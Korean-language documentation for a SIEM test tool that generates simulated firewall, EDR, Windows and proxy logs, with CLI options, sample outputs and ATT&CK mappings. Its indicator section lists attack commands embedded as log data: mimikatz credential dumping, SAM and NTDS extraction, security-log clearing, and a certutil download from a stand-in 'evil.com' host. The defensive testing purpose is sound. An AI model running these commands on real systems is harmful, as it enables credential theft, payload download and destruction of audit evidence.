# SIEM 로그 생성기 (Log Generator) 문서

## 개요 (Overview)

**log_generator.py**는 SIEM-SOAR 플랫폼의 Collector HTTP API로 시뮬레이션된 보안 로그를 전송하는 Python 스크립트입니다.

4개의 실제 기업 환경 자산에서 현실적인 보안 로그를 생성하여, 파이프라인 테스트, 탐지 규칙 검증, 성능 테스트, AI 모델 학습에 사용됩니다.

### 주요 용도

- **파이프라인 테스트**: Parser, Normalizer, Enricher, Router 검증
- **탐지 규칙 개발**: Sigma 규칙 테스트 및 튜닝
- **성능 테스트**: 처리량 및 지연 시간 측정 (100K+ EPS 목표)
- **AI 모델 학습**: Alert Triage, 우선순위 분류 모델 데이터
- **UDM 정규화 검증**: Chronicle UDM 스키마 매핑 확인
- **백엔드 없이 로그 형식 검증**: `--dry-run` 모드로 HTTP 전송 없이 테스트

---

## 지원 자산 (Supported Assets)

다음 4가지 엔터프라이즈 자산에서 현실적인 로그를 생성합니다.

| 자산 | 유형 | Asset ID | 로그 유형 | 특징 |
|------|------|----------|---------|------|
| **Palo Alto PA-5260** | Firewall | `pa-5260-fw-01` | TRAFFIC, THREAT | Syslog 형식, 트래픽 필터링 및 위협 탐지 로그 |
| **CrowdStrike Falcon** | EDR | `cs-falcon-sensor-01` | ProcessRollup2, DetectionSummaryEvent | JSON 형식, 프로세스 실행 및 의심 활동 탐지 |
| **Windows Server 2022** | Security | `win-srv-2022-dc01` | Event 4624, 4625, 4672, 4688 | XML 형식, 로그온, 권한 상승, 프로세스 생성 |
| **Zscaler Cloud Proxy** | Proxy | `zscaler-proxy-01` | Web, DLP, Malware | NSS 형식, 웹 트래픽, 데이터 손실 방지, 악성코드 탐지 |

### 자산 선택

```bash
# 모든 자산 (기본값)
python log_generator.py --asset all

# 특정 자산만 선택 (쉼표로 구분)
python log_generator.py --asset paloalto,windows

# 개별 자산
python log_generator.py --asset crowdstrike
python log_generator.py --asset zscaler
```

---

## 시나리오 유형 (Scenario Types)

생성되는 로그의 특성을 제어하는 3가지 시나리오 모드:

### 1. Normal (정상 시나리오)
- **로그 비율**: 100% 정상 활동
- **사용 시점**: 정상 시스템 동작 검증, 베이스라인 구축
- **포함 콘텐츠**: 정상 트래픽, 성공한 로그온, 일반 프로세스 실행
- **명령어**: `--scenario normal`

```bash
python log_generator.py --scenario normal --rate 5 --duration 60
```

### 2. Attack (공격 시나리오)
- **로그 비율**: 100% 공격 활동 (악의적)
- **사용 시점**: 탐지 규칙 검증, 위협 시뮬레이션
- **포함 콘텐츠**: TOR IP, 의심 명령어, 악성 도메인, DLP 위반
- **명령어**: `--scenario attack`

```bash
python log_generator.py --scenario attack --rate 10 --duration 120
```

### 3. Mixed (혼합 시나리오, 기본값)
- **로그 비율**: 70% 정상 + 30% 공격 (현실적 환경)
- **사용 시점**: 운영 환경 시뮬레이션, 엔드-투-엔드 테스트
- **포함 콘텐츠**: 정상과 악의적 활동 혼합
- **명령어**: `--scenario mixed`

```bash
python log_generator.py --scenario mixed  # 기본값
```

---

## 악성 지표 (Malicious Indicators)

스크립트에 포함된 악성 지표들로, 공격 시나리오에서 무작위로 선택됩니다.

### TOR 출구 노드 및 악성 IP (Malicious IPs)

```
185.220.101.1, 185.220.101.32, 185.220.101.45
45.155.205.10, 45.155.205.100, 45.155.205.233
198.96.155.3, 89.234.157.254, 91.250.242.12
185.100.87.174, 185.220.102.8, 23.129.64.100
```

**용도**: 외부 IP가 필요한 공격 시나리오 (C2 통신, 데이터 반출 등)

### 의심 명령어 (Suspicious Commands)

MITRE ATT&CK 기반 공격 명령어들:

| 명령어 | 기법 | 설명 |
|--------|------|------|
| `powershell -EncodedCommand` | T1027 (Obfuscation) | Base64 인코딩된 PowerShell 명령어 |
| `powershell -ep bypass -nop -windowstyle hidden` | T1086 | 정책 우회 및 숨김 실행 |
| `mimikatz.exe sekurlsa::logonpasswords` | T1003 (Credential Dumping) | 자격증명 추출 |
| `net user Administrator /domain` | T1087 (Account Enumeration) | 도메인 계정 정보 수집 |
| `net group "Domain Admins" /domain` | T1087 | 도메인 관리자 목록 조회 |
| `wmic /node:@targets.txt process call create` | T1047 (WMI) | 원격 프로세스 실행 |
| `psexec.exe \\target -s cmd.exe` | T1021.002 (Lateral Movement) | 횡적 이동 |
| `certutil -urlcache -split -f http://evil.com` | T1105 (Ingress Tool Transfer) | 악성 파일 다운로드 |
| `bitsadmin /transfer malicious` | T1197 (BITS Jobs) | BITS를 이용한 파일 전송 |
| `reg save HKLM\SAM sam.save` | T1003.002 (SAM 추출) | SAM 데이터베이스 백업 |
| `ntdsutil "ac i ntds" "ifm"` | T1003.003 (NTDS 추출) | AD 데이터베이스 추출 |
| `vssadmin create shadow /for=C:` | T1003.004 (VSS) | 볼륨 섀도우 복사본 생성 |
| `wevtutil cl Security` | T1070.001 (Log Deletion) | 보안 이벤트 로그 삭제 |
| `schtasks /create /sc ONSTART /tn "evil"` | T1053.005 (Scheduled Tasks) | 작업 스케줄러를 이용한 지속성 |

### 악성 도메인 (Malicious Domains)

```
evil-c2-server.ru          - C2 서버
malware-drop.cn            - 악성코드 배포 사이트
phishing-bank.tk           - 피싱 사이트
suspicious-download.xyz    - 의심 다운로드
ransomware-payment.onion   - 랜섬웨어 지불 사이트
crypto-mining-pool.net     - 채굴 풀
exfiltration-server.cc     - 데이터 반출 서버
```

### DLP 위반 패턴 (DLP Patterns)

Zscaler에서 탐지되는 데이터 손실 방지 규칙:

```
SSN:XXX-XX-XXXX detected in upload          - 미국 사회보장번호
Credit card number pattern found             - 신용카드 정보
Healthcare HIPAA data detected               - 의료 정보
PII: Korean RRN pattern detected             - 한국 주민번호
Financial data export blocked                - 금융 정보
Source code repository access blocked        - 소스코드
```

---

## CLI 옵션 (Command Line Options)

### 완전한 옵션 목록

| 옵션 | 유형 | 기본값 | 설명 |
|------|------|--------|------|
| `--url` | string | `http://localhost:8087/api/v1/logs` | Collector HTTP API 엔드포인트 |
| `--rate` | int | 5 | 초당 로그 생성 수 (logs/second) |
| `--duration` | int | 60 | 실행 시간 (초) |
| `--scenario` | choice | mixed | 시나리오: `normal`, `attack`, `mixed` |
| `--asset` | string | all | 자산 지정: `all` 또는 쉼표로 구분된 목록 |
| `--dry-run` | flag | False | HTTP 전송 없이 stdout에 출력 (JSON) |
| `--verbose` | flag | False | 각 로그의 metadata와 raw 로그 상세 출력 |

### 옵션 상세 설명

#### `--url`
```bash
# 기본값 사용
python log_generator.py

# 커스텀 Collector 주소
python log_generator.py --url http://192.168.1.100:8087/api/v1/logs

# 원격 SIEM
python log_generator.py --url https://siem.company.com/api/v1/logs
```

#### `--rate` (초당 로그 생성 수)
```bash
# 느린 속도 (테스트)
python log_generator.py --rate 1 --duration 60  # 1 logs/sec

# 중간 속도
python log_generator.py --rate 10 --duration 300  # 10 logs/sec

# 높은 속도 (성능 테스트)
python log_generator.py --rate 100 --duration 600  # 100 logs/sec
```

**처리량 계산**: 총 로그 수 = `rate * duration`
- `--rate 5 --duration 60` → 300 로그 생성

#### `--duration` (실행 시간)
```bash
# 짧은 테스트
python log_generator.py --duration 10  # 10초

# 일반적인 테스트
python log_generator.py --duration 300  # 5분

# 장시간 부하 테스트
python log_generator.py --rate 50 --duration 3600  # 1시간
```

#### `--scenario` (시나리오 선택)
```bash
# 정상 트래픽만
python log_generator.py --scenario normal

# 공격만 시뮬레이션
python log_generator.py --scenario attack

# 혼합 (기본, 30% 공격)
python log_generator.py --scenario mixed
```

#### `--asset` (자산 선택)
```bash
# 모든 자산 (4가지)
python log_generator.py --asset all

# 방화벽만
python log_generator.py --asset paloalto

# EDR과 Windows만
python log_generator.py --asset crowdstrike,windows

# 복수 자산 (순서 무관)
python log_generator.py --asset zscaler,paloalto,windows
```

#### `--dry-run` (HTTP 없이 stdout으로 출력)
```bash
# 백엔드 서비스 없이 로그 형식 검증
python log_generator.py --dry-run --rate 2 --duration 10

# 공격 로그 샘플 확인
python log_generator.py --dry-run --scenario attack --asset windows

# 상세 내용 확인
python log_generator.py --dry-run --verbose --rate 1 --duration 5
```

#### `--verbose` (상세 출력)
```bash
# dry-run과 함께 사용 시 metadata와 raw 로그 표시
python log_generator.py --dry-run --verbose

# 실제 전송하면서도 상세 정보 출력
python log_generator.py --verbose
```

---

## 사용 예시 (Usage Examples)

### 예시 1: 기본 실행 (기본 설정)

```bash
python log_generator.py
```

**설정**:
- 모든 자산 (Palo Alto, CrowdStrike, Windows, Zscaler)
- Mixed 시나리오 (30% 공격)
- 5 logs/sec 속도
- 60초 실행
- Collector: `http://localhost:8087/api/v1/logs`

**출력 예**:
```
============================================================
SIEM Log Generator
============================================================
Collector URL: http://localhost:8087/api/v1/logs
Rate: 5 logs/second
Duration: 60 seconds
Scenario: mixed
Assets: paloalto, crowdstrike, windows, zscaler
============================================================

[INFO] Testing connection to collector...
[OK] Collector is healthy

[INFO] Starting log generation...

[PROGRESS] Elapsed: 10.2s | Logs: 51 | Rate: 5.0/s | Errors: 0
```

### 예시 2: 공격 시나리오만 높은 속도

```bash
python log_generator.py --scenario attack --rate 20 --duration 300
```

**용도**: 탐지 규칙 벤치마킹, 공격 로그 대량 생성

**로그 특성**:
- TOR IP에서의 악의적 트래픽
- Mimikatz, PSExec 등 의심 명령어
- DLP 위반 (민감 정보 업로드)
- 악성 도메인 접속 시도

### 예시 3: Windows 보안 이벤트 수집

```bash
python log_generator.py --asset windows --scenario normal --rate 3 --duration 120
```

**로그 유형**:
- Event 4624: 성공한 로그온
- Event 4625: 실패한 로그온 시도
- Event 4672: 특수 권한 할당
- Event 4688: 프로세스 생성

### 예시 4: Dry-Run으로 로그 형식 검증 (백엔드 없음)

```bash
python log_generator.py --dry-run --verbose --rate 2 --duration 10
```

**특징**:
- HTTP 요청 없음 (Collector 필요 없음)
- 로그를 stdout에 pretty-printed JSON으로 출력
- 각 로그의 metadata와 raw 로그 표시
- Parser 개발 시 로그 형식 확인용

**출력 예**:
```
[DRY-RUN] source_type=firewall | severity=high
  asset_id: pa-5260-fw-01
  severity: high
  log_type: TRAFFIC
  action: deny
  src_ip: 10.0.1.42
  dst_ip: 185.220.101.1
  src_port: 54321
  dst_port: 443
  raw: <14>1 2024-02-19T15:30:45.123456+00:00 PA-5260 - - - TRAFFIC,...

{
  "timestamp": "2024-02-19T15:30:45.123456+00:00",
  "raw": "<14>1 2024-02-19T15:30:45.123456+00:00 PA-5260 - - - ...",
  "metadata": {
    "asset_id": "pa-5260-fw-01",
    "severity": "high",
    ...
  }
}
```

### 예시 5: 크라우드스트라이크 EDR 로그 (공격 탐지)

```bash
python log_generator.py --asset crowdstrike --scenario attack --rate 5 --duration 60
```

**생성 로그 유형**:
- ProcessRollup2: Mimikatz, PSExec 등 의심 프로세스
- DetectionSummaryEvent:
  - "Suspicious PowerShell Download"
  - "Credential Dumping Attempt"
  - "Lateral Movement Detected"
  - "Ransomware Behavior Blocked"

**MITRE ATT&CK 매핑**:
- T1003.001 (OS Credential Dumping)
- T1021.002 (Remote Service Session Initiation - SMB)
- T1053.005 (Scheduled Task)
- T1055 (Process Injection)

### 예시 6: Zscaler DLP 및 악성코드 탐지

```bash
python log_generator.py --asset zscaler --scenario attack --rate 10 --duration 120
```

**생성 로그 유형**:
- **DLP (Data Loss Prevention)**
  - Korean RRN 패턴 감지
  - 신용카드 정보 감지
  - 소스코드 저장소 접속 차단

- **Malware**
  - Emotet, Ryuk 랜섬웨어
  - Trojan, Spyware 변형
  - MD5/SHA256 해시 포함

### 예시 7: 부하 테스트 (처리량 검증)

```bash
# 100K+ EPS 목표 테스트
python log_generator.py --rate 500 --duration 300 --scenario mixed
```

**결과**:
- 총 로그 생성: 500 * 300 = 150,000 로그
- 실행 시간: 5분
- 기대 처리량: 500 logs/sec

### 예시 8: 특정 기간 동안 특정 자산 테스트

```bash
# 각 자산별로 1분씩 테스트
python log_generator.py --asset paloalto --rate 10 --duration 60
python log_generator.py --asset crowdstrike --rate 10 --duration 60
python log_generator.py --asset windows --rate 10 --duration 60
python log_generator.py --asset zscaler --rate 10 --duration 60
```

---

## 출력 형식 (Output Format)

### HTTP 페이로드 구조

모든 로그는 Collector HTTP API로 다음 형식으로 전송됩니다:

```json
{
  "tenant_id": "default",
  "source_type": "firewall|edr|windows|proxy",
  "logs": [
    {
      "timestamp": "2024-02-19T15:30:45.123456+00:00",
      "raw": "[원본 로그 문자열]",
      "metadata": {
        "asset_id": "자산 고유 ID",
        "severity": "low|medium|high|critical",
        "[자산별 추가 필드들]"
      }
    }
  ]
}
```

### 자산별 메타데이터 필드

#### Palo Alto Firewall
```json
{
  "asset_id": "pa-5260-fw-01",
  "severity": "high",
  "log_type": "TRAFFIC|THREAT",
  "action": "allow|deny|drop|reset-both",
  "src_ip": "10.0.1.42",
  "dst_ip": "8.8.8.8",
  "src_port": 54321,
  "dst_port": 443,
  "threat_type": "virus|spyware|vulnerability|url-filtering|wildfire",
  "threat_name": "Emotet|Cobalt Strike Beacon|..."
}
```

#### CrowdStrike Falcon EDR
```json
{
  "asset_id": "cs-falcon-sensor-01",
  "severity": "critical",
  "event_type": "ProcessRollup2|DetectionSummaryEvent",
  "hostname": "WORKSTATION-042",
  "process_name": "mimikatz.exe|powershell.exe",
  "tactic": "Credential Access|Privilege Escalation|...",
  "technique": "T1003.001|T1055|..."
}
```

#### Windows Security Events
```json
{
  "asset_id": "win-srv-2022-dc01",
  "severity": "high",
  "event_id": 4624,
  "event_description": "An account was successfully logged on",
  "username": "admin",
  "logon_type": "Interactive|Network|RemoteInteractive",
  "source_ip": "192.168.1.100"
}
```

#### Zscaler Cloud Proxy
```json
{
  "asset_id": "zscaler-proxy-01",
  "severity": "critical",
  "log_type": "web|dlp|malware",
  "action": "allowed|blocked|cautioned|bypassed",
  "url": "https://evil.com/payload.exe",
  "category": "Business|Malware|Phishing|...",
  "dlp_pattern": "Credit card number pattern found",
  "username": "jkim@corp.local"
}
```

### 로그 샘플

#### Palo Alto TRAFFIC 로그
```
Raw: <14>1 2024-02-19T15:30:45.123456+00:00 PA-5260 - - - TRAFFIC,1708356645,0x0,10.0.1.42,8.8.8.8,,,web-browsing,jkim,trust,untrust,rule-42,54321,443,allow,5000,800,0,tcp

Metadata:
{
  "asset_id": "pa-5260-fw-01",
  "severity": "informational",
  "log_type": "TRAFFIC",
  "action": "allow",
  "src_ip": "10.0.1.42",
  "dst_ip": "8.8.8.8",
  "src_port": 54321,
  "dst_port": 443
}
```

#### CrowdStrike DetectionSummaryEvent
```
Raw: {
  "event_type": "DetectionSummaryEvent",
  "timestamp": "2024-02-19T15:30:45.123456+00:00",
  "hostname": "WORKSTATION-042",
  "detection_name": "Credential Dumping Attempt",
  "tactic": "Credential Access",
  "technique": "T1003.001",
  "severity": "Critical",
  "process_name": "mimikatz.exe"
}

Metadata:
{
  "asset_id": "cs-falcon-sensor-01",
  "severity": "critical",
  "event_type": "DetectionSummaryEvent",
  "hostname": "WORKSTATION-042",
  "tactic": "Credential Access",
  "technique": "T1003.001"
}
```

#### Windows Event 4625 (Failed Logon)
```
Raw: <Event xmlns="...">
  <System>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2024-02-19T15:30:45.123456+00:00"/>
    <Computer>WIN-SRV-DC01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="IpAddress">185.220.101.1</Data>
  </EventData>
</Event>

Metadata:
{
  "asset_id": "win-srv-2022-dc01",
  "severity": "high",
  "event_id": 4625,
  "event_description": "An account failed to log on",
  "username": "Administrator",
  "logon_type": "Network",
  "source_ip": "185.220.101.1"
}
```

#### Zscaler DLP Event
```
Raw: 2024-02-19T15:30:45.123456+00:00 zscaler DLP:
datetime=2024-02-19T15:30:45.123456+00:00
user=jkim@corp.local
srcip=10.0.1.42
action=blocked
dlpengine=Content-Inspection
dlprulename=Sensitive-Data-Policy
dlpdictionary=PII-Detection
dlpdetail="PII: Korean RRN pattern detected"
filesize=5242880
filename=confidential-42.xlsx

Metadata:
{
  "asset_id": "zscaler-proxy-01",
  "severity": "critical",
  "log_type": "dlp",
  "action": "blocked",
  "dlp_pattern": "PII: Korean RRN pattern detected",
  "username": "jkim@corp.local"
}
```

---

## MITRE ATT&CK 매핑

생성되는 로그에 포함된 공격 기법들:

### 초기 접근 (Initial Access)
- **T1189** (Drive-by Compromise): 악성 웹사이트 접속
- **T1566.002** (Phishing - Spearphishing Link): 피싱 링크

### 실행 (Execution)
- **T1059.001** (PowerShell): 인코딩된 PowerShell 명령어
- **T1047** (WMI): WMIC를 통한 원격 명령어 실행
- **T1053.005** (Scheduled Task): 작업 스케줄러

### 지속성 (Persistence)
- **T1547.001** (Boot or Logon Autostart Execution - Registry Run Keys): 레지스트리 자동 실행

### 권한 상승 (Privilege Escalation)
- **T1548.002** (Abuse Elevation Control Mechanism - Bypass UAC): UAC 우회
- **T1547.001** (Boot or Logon Autostart Execution): 자동 실행 설정

### 방어 회피 (Defense Evasion)
- **T1027** (Obfuscation of Command and Scripts): 명령어 난독화
- **T1036** (Masquerading): 프로세스 위장
- **T1070.001** (Indicator Removal - Clear Windows Event Logs): 로그 삭제
- **T1140** (Deobfuscate/Decode Files or Information): 인코딩 해제

### 자격증명 접근 (Credential Access)
- **T1110.001** (Brute Force - Password Guessing): 무차별 대입 공격
- **T1003** (OS Credential Dumping): 자격증명 추출
  - **T1003.001**: SAM
  - **T1003.002**: NTDS.dit
  - **T1003.003**: LSA Secrets
  - **T1003.004**: VSS

### 탐색 (Discovery)
- **T1087** (Account Enumeration): 계정 정보 수집
- **T1082** (System Information Discovery): 시스템 정보 수집

### 횡적 이동 (Lateral Movement)
- **T1021.002** (Remote Services - SMB/Windows Admin Shares): PSExec 등
- **T1550.002** (Use Alternate Authentication Material - Pass the Hash): Pass-the-Hash

### 수집 (Collection)
- **T1056** (Input Capture): 키 입력 캡처
- **T1005** (Data from Local System): 로컬 데이터 수집

### 외부 반출 (Exfiltration)
- **T1041** (Exfiltration Over C2 Channel): C2 채널을 통한 데이터 반출
- **T1048** (Exfiltration Over Alternative Protocol): 대체 프로토콜 사용

### C2 통신 (Command and Control)
- **T1071.001** (Application Layer Protocol - Web Protocols): HTTP/HTTPS C2
- **T1008** (Fallback Channels): 백업 C2 채널

### 영향 (Impact)
- **T1486** (Data Encrypted for Impact): 데이터 암호화 (랜섬웨어)
- **T1531** (Account Access Removal): 계정 삭제

---

## 문제 해결 (Troubleshooting)

### 문제: "Connection refused"

**증상**: `[ERROR] Request failed: [Errno 111] Connection refused`

**원인**: Collector 서비스가 실행 중이 아니거나 잘못된 URL

**해결**:
```bash
# Collector 서비스 확인
curl http://localhost:8087/api/v1/health

# 올바른 URL로 실행
python log_generator.py --url http://collector-ip:8087/api/v1/logs

# 또는 dry-run으로 백엔드 없이 테스트
python log_generator.py --dry-run
```

### 문제: "HTTP 400/422 Bad Request"

**증상**: `[ERROR] HTTP 400: Invalid log format`

**원인**: 생성된 로그 형식이 Collector 스키마와 맞지 않음

**해결**:
```bash
# Dry-run으로 로그 형식 확인
python log_generator.py --dry-run --verbose --rate 1 --duration 5

# 로그 구조 검증 (metadata 필드 확인)
# Collector API 스키마와 비교
```

### 문제: "AttributeError: module 'sys' has no attribute 'exit'"

**증상**: Python 런타임 에러

**원인**: Python 3.11+ 호환성 문제

**해결**:
```bash
# Python 버전 확인
python --version  # Python 3.11 이상 필요

# 필수 패키지 설치
pip install requests
```

### 문제: "로그 생성 속도가 느림"

**증상**: `Rate: 3.2/s` (원하는 속도보다 낮음)

**원인**: Collector가 느리거나 네트워크 지연

**해결**:
```bash
# Dry-run으로 로컬 성능 측정
python log_generator.py --dry-run --rate 100 --duration 10

# 배치 크기 조정 (코드 수정 필요)
# 또는 Collector 성능 최적화
```

### 문제: Windows에서 색상이 표시되지 않음

**증상**: `[DRY-RUN]` 텍스트가 색상 없이 나타남

**설명**: Windows cmd/PowerShell에서는 ANSI 색상이 기본 미지원

**해결**: 스크립트가 자동으로 감지하여 처리됨 (문제 아님)

---

## 성능 고려사항 (Performance Tuning)

### 높은 처리량 테스트 (100K+ EPS)

```bash
# 단계별 부하 테스트
# 1단계: 기본 속도 (5 logs/sec)
python log_generator.py --rate 5 --duration 60

# 2단계: 중간 속도 (50 logs/sec)
python log_generator.py --rate 50 --duration 120

# 3단계: 고속 (500 logs/sec, 5분)
python log_generator.py --rate 500 --duration 300

# 4단계: 극속 (1000 logs/sec, 10분)
python log_generator.py --rate 1000 --duration 600
```

### 메모리 사용량 최적화

- 배치 크기: 최대 10개 로그 (자동 조정)
- 각 로그 크기: ~1KB (메타데이터 포함)
- 메모리 사용: `rate * 10 * 1KB` (예: 100 logs/sec → 1MB)

### 네트워크 대역폭

```bash
# 대역폭 계산
# 로그당: ~1KB
# 초당 로그: rate
# 초당 대역폭: rate * 1KB

# 예: 500 logs/sec → 500KB/sec = 0.5MB/sec = 4Mbps
```

---

## 고급 사용법 (Advanced Usage)

### CI/CD 파이프라인 통합

```bash
#!/bin/bash
# test_pipeline.sh

echo "Running SIEM pipeline tests..."

# 파일럿 테스트
python scripts/log_generator.py \
  --dry-run \
  --scenario normal \
  --rate 10 \
  --duration 30

# 실제 전송 테스트
python scripts/log_generator.py \
  --url http://collector:8087/api/v1/logs \
  --scenario mixed \
  --rate 20 \
  --duration 60

# 탐지 규칙 검증
python scripts/log_generator.py \
  --scenario attack \
  --asset paloalto,windows \
  --rate 10 \
  --duration 120

echo "Pipeline tests completed"
```

### 멀티 플레이 로드 생성

```bash
#!/bin/bash
# parallel_load.sh

# 4개의 시뮬레이션을 병렬로 실행
python scripts/log_generator.py --asset paloalto --rate 25 &
python scripts/log_generator.py --asset crowdstrike --rate 25 &
python scripts/log_generator.py --asset windows --rate 25 &
python scripts/log_generator.py --asset zscaler --rate 25 &

wait
echo "All generators finished"
```

결과: 총 100 logs/sec

### 시간대별 로그 분포

```bash
#!/bin/bash
# scheduled_load.sh

# 비즈니스 시간 (높은 부하)
for hour in {8..18}; do
  python scripts/log_generator.py \
    --rate 100 \
    --duration 3600 \
    --scenario mixed
done

# 야간 (낮은 부하)
for hour in {19..23} {0..7}; do
  python scripts/log_generator.py \
    --rate 20 \
    --duration 3600 \
    --scenario normal
done
```

---

## 참고 문서

- [Collector API 문서](../docs/api/collector.md)
- [Parser 개발 가이드](../docs/operations/parser_development.md)
- [Sigma 규칙 문서](../docs/schema/sigma_rules.md)
- [UDM 정규화 스키마](../docs/schema/udm.md)
- [MITRE ATT&CK 프레임워크](https://attack.mitre.org/)

---

## 라이선스 및 기여

이 스크립트는 SIEM-SOAR 플랫폼의 일부입니다.

**개발자**: SIEM-SOAR 플랫폼 팀
**최종 수정**: 2024-02-19
